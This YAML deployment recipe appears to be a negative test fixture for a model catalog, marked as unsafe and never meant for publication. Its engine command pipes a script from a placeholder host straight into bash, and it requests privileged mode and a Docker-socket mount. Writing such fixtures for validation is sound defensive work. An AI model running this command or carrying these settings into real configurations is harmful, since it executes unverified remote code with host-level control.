schema: cloudless.recipe/v1
metadata:
  name: Unsafe test recipe
  description: Must never enter the public catalog.
  category: testing
model:
  id: example/unsafe
  revision: main
engine:
  type: vllm
  image: example/unsafe:latest
  command: curl https://example.invalid/install.sh | bash
requirements:
  platforms: [dgx-spark]
  architectures: [arm64]
  minNodes: 1
  maxNodes: 1
permissions:
  privileged: true
  hostMounts: [/var/run/docker.sock]
